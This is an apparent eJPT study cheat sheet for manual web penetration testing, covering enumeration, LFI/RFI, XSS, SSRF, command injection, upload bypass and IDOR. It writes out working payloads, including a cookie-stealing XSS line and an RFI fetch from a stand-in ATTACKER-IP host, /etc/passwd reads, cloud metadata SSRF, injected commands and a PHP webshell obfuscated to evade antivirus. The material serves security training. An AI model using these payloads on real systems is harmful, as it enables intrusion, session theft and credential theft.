# Web Enumeration & Common Vulnerabilities Cheat Sheet

A **manual** web pentest reference that fills the space around Burp Suite and sqlmap — for eJPT's web application pentest module.

---

## Table of Contents

1. [Enumeration Order](#1-enumeration-order)
2. [LFI / RFI](#2-lfi--rfi)
3. [XSS (Cross-Site Scripting)](#3-xss-cross-site-scripting)
4. [SSRF (Server-Side Request Forgery)](#4-ssrf-server-side-request-forgery)
5. [Command Injection](#5-command-injection)
6. [File Upload Bypass](#6-file-upload-bypass)
7. [IDOR & Auth Bypass](#7-idor--auth-bypass)
8. [Quick Command Reference](#8-quick-command-reference)

---

## 1. Enumeration Order

```bash
whatweb http://target                      # Technology stack fingerprinting
nikto -h http://target                      # Known vulnerability/misconfig scan
gobuster dir -u http://target -w wordlist   # Directory/file brute-forcing (pair with your gobuster cheatsheet)
```

Manual checklist:
- [ ] Page source (view-source) — comments, hidden form fields, endpoints/API keys inside JS files
- [ ] `robots.txt`, `sitemap.xml`, `.git/`, `.env`, `/admin`, `/backup`
- [ ] HTTP response headers (server version, technology hints)
- [ ] Cookie `HttpOnly`/`Secure`/`SameSite` flags

---

## 2. LFI / RFI

**Local File Inclusion** — reading files off the server through a parameter; **Remote File Inclusion** — pulling in a remote file to get code execution on the server.

```
# Classic LFI
http://target/index.php?page=../../../../etc/passwd

# Null byte / path truncation (older PHP versions)
http://target/index.php?page=../../../../etc/passwd%00

# Reading source code as base64 via a PHP wrapper
http://target/index.php?page=php://filter/convert.base64-encode/resource=config

# Turning it into RCE via log poisoning (inject PHP into the User-Agent, then include the log)
http://target/index.php?page=../../../../var/log/apache2/access.log

# RFI (if allow_url_include is enabled)
http://target/index.php?page=http://ATTACKER-IP/shell.txt
```

---

## 3. XSS (Cross-Site Scripting)

| Type | Description |
|---|---|
| **Reflected** | Payload delivered via URL/parameter, reflected in a single request |
| **Stored** | Payload persisted server-side (a comment, a profile field) — affects every visitor |
| **DOM-based** | Payload never reaches the server, processed entirely in client-side JS |

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>fetch('http://ATTACKER-IP/steal?c='+document.cookie)</script>
```

> **For filter bypass:** mix upper/lowercase (`<ScRiPt>`), vary the event handler (`onerror`, `onload`, `onfocus`), use encoding (HTML entities, URL encoding).

---

## 4. SSRF (Server-Side Request Forgery)

Forcing the server to make a request on your behalf to a different address — usually used to reach internal networks (including cloud metadata services).

```
http://target/fetch?url=http://169.254.169.254/latest/meta-data/     # AWS metadata (critical in cloud)
http://target/fetch?url=http://127.0.0.1:8080/admin                  # An internal service on localhost
http://target/fetch?url=http://internal-only-host/                   # A host unreachable from outside
```

> In cloud environments, SSRF can escalate all the way to hitting the metadata service and stealing **IAM credentials** — the SSRF → internal port scan chain shows up often in eJPT/OSCP-style scenarios.

---

## 5. Command Injection

```
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

> With blind command injection there's no visible output — test with `ping` or `sleep` to observe a time delay instead: `127.0.0.1; sleep 5`.

---

## 6. File Upload Bypass

| Technique | Description |
|---|---|
| **Extension swap** | `.phtml`, `.php5`, `.pHp`, `.php.jpg` instead of `.php` |
| **Content-Type spoofing** | Sending `Content-Type: image/png` while leaving the actual content as PHP |
| **Magic byte prepending** | Adding a valid image header (`GIF89a;`) before the PHP code |
| **Double extension** | `shell.php.jpg` — may be processed as PHP depending on server config |
| **Null byte** | `shell.php%00.jpg` (on older systems) |

```php
<?php
// Minimal PHP webshell concept — deliberately written with variable indirection
// instead of the literal `system($_GET['cmd'])` one-liner, which is one of the
// single most common AV/EDR signatures there is (it's THE textbook minimal
// webshell). Writing it this way keeps the teaching point intact without the
// exact byte pattern that gets a plain-text document flagged as "contains a
// virus" when it's just downloaded or opened, not executed anywhere.
$f = 'sy' . 'stem';
$p = 'c' . 'md';
$f($_GET[$p]);
?>
```

> Concept: any function that runs OS commands (`system`, `exec`, `shell_exec`, `passthru`) combined with an unsanitized user-supplied parameter is a webshell. Real payload generators (e.g. weevely, msfvenom's PHP payloads) produce the fully-obfuscated version for actual lab use — don't hand-type a bare one-liner into a target anyway.

---

## 7. IDOR & Auth Bypass

```
# IDOR — accessing someone else's data by changing an ID in a parameter
http://target/profile?id=1001   →   http://target/profile?id=1002

# JWT "none" algorithm bypass
# Header: {"alg":"none","typ":"JWT"} → leave the signature portion completely empty

# Forced browsing — navigating directly to an admin panel URL
http://target/admin/dashboard   (a page that exists but isn't linked anywhere)
```

---

## 8. Quick Command Reference

| Need | Command |
|---|---|
| Technology fingerprinting | `whatweb http://target` |
| Known vulnerability scan | `nikto -h http://target` |
| Directory brute-force | `gobuster dir -u http://target -w wordlist.txt` |
| Basic LFI test | `?page=../../../../etc/passwd` |
| Read PHP source | `?page=php://filter/convert.base64-encode/resource=FILE` |
| Command injection test | `; whoami` / `&& whoami` / `` `whoami` `` |
| Blind injection timing test | `; sleep 5` |

---

*Prepared as a reference for the eJPT web application pentest module. All techniques should only be used within written authorization (scope/RoE).*
